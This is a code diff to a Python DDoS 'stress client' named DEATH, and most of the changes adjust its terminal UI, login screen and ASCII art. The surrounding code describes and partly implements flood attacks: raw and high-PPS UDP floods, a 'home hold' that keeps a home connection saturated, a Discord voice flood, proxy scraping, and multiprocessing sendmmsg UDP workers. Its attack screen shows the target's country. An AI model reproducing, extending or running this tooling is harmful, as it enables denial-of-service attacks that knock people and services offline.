@@ -1,13 +1,11 @@
 #!/usr/bin/env python3
 # ============================================================
-#  DEATH — terminal stress client (ssh-stable, high-throughput)
+#  DEATH — terminal stress client
 # ============================================================
-#  - raw pty mode enforced (stty + termios)
-#  - escape-sequence drain in input handler
-#  - left-aligned layout (no more centering wrap)
-#  - capped layout width (200 cols max)
-#  - UDP attacks use multiprocessing + sendmmsg batching
-#  - scrape intact, workers tuned for 0.1 CPU
+#  original layout math preserved
+#  + raw pty mode (ssh-stable)
+#  + escape drain
+#  + high-throughput UDP (multiprocessing + sendmmsg)
 # ============================================================
 
 import os
@@ -84,7 +82,7 @@ def restore_tty():
         pass
 
 # ============================================================
-#  SENDMMSG BATCHING VIA ctypes (linux only)
+#  SENDMMSG BATCHING (linux)
 # ============================================================
 
 LIBC = None
@@ -133,6 +131,9 @@ class MMsgHdr(ctypes.Structure):
 
 ESC = "\x1b"
 RESET = f"{ESC}[0m"
+BOLD = f"{ESC}[1m"
+DIM = f"{ESC}[2m"
+
 CLEAR = f"{ESC}[2J{ESC}[H"
 HOME = f"{ESC}[H"
 HIDE_CURSOR = f"{ESC}[?25l"
@@ -140,6 +141,9 @@ SHOW_CURSOR = f"{ESC}[?25h"
 
 def fg(r, g, b):
     return f"{ESC}[38;2;{r};{g};{b}m"
+
+def bg(r, g, b):
+    return f"{ESC}[48;2;{r};{g};{b}m"
 
 def move(row, col):
     return f"{ESC}[{row};{col}H"
@@ -176,7 +180,21 @@ EMBLEM = r"""
         `""Y8888888P""`
 """.strip("\n")
 
-SKULL_SMALL = EMBLEM
+SKULL_SMALL = r"""
+     _..od88888bo.._
+   .d""'   888   '""b.
+  .d"'      888      '"b.
+  d"'        888        '"b
+ d'          888          'b
+ 88          88888          88
+(88         8888888         88)
+ 88        888888888        88
+  YI      888 888 888      IP
+   YI    888  888  888    IP
+    "9. 888   888   888 .P"
+      "888    888    888"
+        `""Y8888888P""`
+""".strip("\n")
 
 COMMANDS = [
     ("clear",        "clear screen"),
@@ -230,7 +248,7 @@ METHODS = [
 ]
 
 METHOD_INFO = {
-    "udp":        "Raw UDP flood via multiprocessing + sendmmsg batching. Local sockets only.",
+    "udp":        "Raw UDP flood. Sends large datagrams at high rate to the target. Local sockets only.",
     "pps":        "High packets-per-second UDP flood. Small datagrams, maximum send rate.",
     "hold":       "Low bandwidth home hold. Sustained UDP stream to keep a home connection saturated.",
     "discord":    "Discord voice flood. Sends RTP/STUN-shaped UDP to media port range.",
@@ -284,10 +302,7 @@ PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")
 #  TERMINAL SIZE
 # ============================================================
 
-LAYOUT_MAX_COLS = 200
-
 def term_size() -> Tuple[int, int]:
-    """Real terminal size."""
     try:
         sz = os.get_terminal_size(sys.stdout.fileno())
         cols, rows = sz.columns, sz.lines
@@ -301,12 +316,6 @@ def term_size() -> Tuple[int, int]:
         return sz.columns, sz.lines
     except Exception:
         return 80, 24
-
-def layout_cols() -> int:
-    """Capped column count for layout math. Prevents centering-based wrap
-    on super-wide terminals."""
-    cols, _ = term_size()
-    return min(cols, LAYOUT_MAX_COLS)
 
 # ============================================================
 #  USERS
@@ -459,6 +468,10 @@ def visible_len(s):
             out += 1
             i += 1
     return out
+
+def center_visible(s, width):
+    pad = max(0, (width - visible_len(s)) // 2)
+    return " " * pad + s
 
 def emblem_static(theme):
     ar, ag, ab = theme["accent"]
@@ -780,7 +793,7 @@ def scrape_and_validate(on_progress, stop):
     return alive
 
 # ============================================================
-#  HIGH-THROUGHPUT UDP WORKERS (multiprocessing + sendmmsg)
+#  HIGH-THROUGHPUT UDP WORKERS
 # ============================================================
 
 UDP_BATCH = 64
@@ -788,7 +801,6 @@ UDP_PAYLOAD = 1400
 
 def _udp_worker_process(host_ip: str, port: int, stop_flag, sent_counter, failed_counter,
                         payload_mode: str):
-    """Runs in its own process — bypasses GIL. Uses sendmmsg when available."""
     if payload_mode == "small":
         payloads = [os.urandom(random.randint(64, 256)) for _ in range(32)]
     elif payload_mode == "rtp":
@@ -1294,24 +1306,35 @@ def _attack_inner(method, host, port, duration):
     time.sleep(0.4)
 
 # ============================================================
-#  RENDERERS — left-aligned, capped width
+#  RENDERERS — ORIGINAL LAYOUT MATH
 # ============================================================
 
 def render_banner():
     theme = S.theme
+    cols, _ = term_size()
     banner_lines = BANNER_DEATH.split("\n")
+    banner_w = max(len(l) for l in banner_lines)
+    pad = max(0, (cols - banner_w) // 2)
     out = ["\n"]
     for line in banner_lines:
-        out.append("  " + gradient_static(line, theme) + "\n")
+        out.append(" " * pad + gradient_static(line, theme) + "\n")
     return "".join(out)
 
-def render_prompt_cell():
+def render_prompt(frame):
+    theme = S.theme
     _, rows = term_size()
-    return move(rows, 1) + clear_line()
+    blink = (frame // 4) % 2 == 0
+    cursor = solid("█", theme, "accent") if blink else " "
+    user = solid(S.username or "guest", theme, "accent")
+    sep = solid("●", theme, "accent")
+    brand = solid("death", theme, "accent")
+    arrow = solid("►", theme, "accent")
+    line = f"{user}{sep}{brand}{arrow} {S.input_buffer}{cursor}"
+    return move(rows, 1) + clear_line() + line
 
 def render_attack_screen(frame):
     theme = S.theme
-    cols = layout_cols()
+    cols, _ = term_size()
     a = S.attack_screen
     if a is None:
         return ""
@@ -1319,7 +1342,7 @@ def render_attack_screen(frame):
     out = [HOME, CLEAR]
     header = "D E A T H   |   A T T A C K I N G"
     out.append("\n")
-    out.append("  " + gradient_static(header, theme) + "\n")
+    out.append(center_visible(gradient_static(header, theme), cols) + "\n")
     out.append("\n")
 
     emblem_lines = emblem_static(theme)
@@ -1348,16 +1371,7 @@ def render_attack_screen(frame):
     mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))
 
     mid_w = max(visible_len(x) for x in mid) if mid else 0
-    left_pad = 4
-    side_by_side_width = left_pad + emblem_w + gap + mid_w + gap + emblem_w
-    if cols < side_by_side_width:
-        for l in emblem_lines:
-            out.append(" " * left_pad + l + "\n")
-        out.append("\n")
-        for row in mid:
-            out.append(" " * left_pad + row + "\n")
-        return "".join(out)
-
+    left_pad = 6
     max_rows = max(len(emblem_lines), len(mid))
     for i in range(max_rows):
         left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
@@ -1369,7 +1383,7 @@ def render_attack_screen(frame):
 
 def render_home():
     theme = S.theme
-    cols = layout_cols()
+    cols, _ = term_size()
     out = []
     emblem_lines = emblem_static(theme)
     emblem_w = max(len(l) for l in EMBLEM.split("\n"))
@@ -1381,15 +1395,6 @@ def render_home():
             method_lines.append("  " + solid(name.ljust(8), theme, "accent") + " - " + solid(desc, theme, "dim"))
         method_lines.append("")
 
-    if cols < emblem_w + 44:
-        out.append("\n")
-        for l in emblem_lines:
-            out.append(l + "\n")
-        out.append("\n")
-        for l in method_lines:
-            out.append(l + "\n")
-        return "".join(out)
-
     left_pad = 4
     gap = 4
     out.append("\n")
@@ -1400,7 +1405,7 @@ def render_home():
         out.append(" " * left_pad + left + " " * gap + right + "\n")
     return "".join(out)
 
-def render_commands():
+def render_commands(frame):
     theme = S.theme
     out = ["\n"]
     out.append("  " + solid("commands", theme, "accent") + "\n")
@@ -1410,7 +1415,7 @@ def render_commands():
     out.append("\n")
     return "".join(out)
 
-def render_methods():
+def render_methods(frame):
     theme = S.theme
     out = ["\n"]
     for section, items in METHODS:
@@ -1423,7 +1428,7 @@ def render_methods():
         out.append("\n")
     return "".join(out)
 
-def render_log():
+def render_log(frame):
     theme = S.theme
     out = ["\n"]
     out.append("  " + solid("session log", theme, "accent") + "\n")
@@ -1435,13 +1440,13 @@ def render_log():
     out.append("\n")
     return "".join(out)
 
-def render_body():
+def render_body(frame):
     if S.current_view == "commands":
-        return render_commands()
+        return render_commands(frame)
     if S.current_view == "methods":
-        return render_methods()
+        return render_methods(frame)
     if S.current_view == "log":
-        return render_log()
+        return render_log(frame)
     return render_home()
 
 # ============================================================
@@ -1678,8 +1683,11 @@ def cmd_ascii(args):
     if name == "banner":
         for line in BANNER_DEATH.split("\n"):
             S.log_line(line)
-    elif name in ("emblem", "skull"):
+    elif name == "emblem":
         for line in EMBLEM.split("\n"):
+            S.log_line(line)
+    elif name == "skull":
+        for line in SKULL_SMALL.split("\n"):
             S.log_line(line)
     else:
         S.log_line(f"unknown asset: {name}")
@@ -1866,6 +1874,7 @@ def prompt_input(row: int, label: str, mask: bool) -> Optional[str]:
 
 def login_screen() -> bool:
     theme = S.theme
+    cols, _ = term_size()
 
     sys.stdout.write(CLEAR + HOME)
     banner = render_banner()
@@ -1875,16 +1884,16 @@ def login_screen() -> bool:
 
     title_row = banner_rows + 2
     sys.stdout.write(move(title_row, 1) + clear_line()
-                     + "  " + solid("login", theme, "accent"))
+                     + center_visible(solid("login", theme, "accent"), cols))
     sys.stdout.flush()
 
     user_row = title_row + 2
     pass_row = user_row + 1
 
-    username = prompt_input(user_row, "  username: ", mask=False)
+    username = prompt_input(user_row, "username: ", mask=False)
     if username is None:
         return False
-    password = prompt_input(pass_row, "  password: ", mask=True)
+    password = prompt_input(pass_row, "password: ", mask=True)
     if password is None:
         return False
 
@@ -1895,7 +1904,7 @@ def login_screen() -> bool:
         return True
 
     sys.stdout.write(move(pass_row + 2, 1) + clear_line()
-                     + "  " + solid("access denied", theme, "accent"))
+                     + center_visible(solid("access denied", theme, "accent"), cols))
     sys.stdout.flush()
     time.sleep(1.5)
     return login_screen()
@@ -1975,7 +1984,7 @@ def main():
             if S.dirty or view_changed:
                 buf = [HOME, CLEAR]
                 buf.append(render_banner())
-                buf.append(render_body())
+                buf.append(render_body(S.frame))
                 _, rows = term_size()
                 theme = S.theme
                 user = solid(S.username or "guest", theme, "accent")
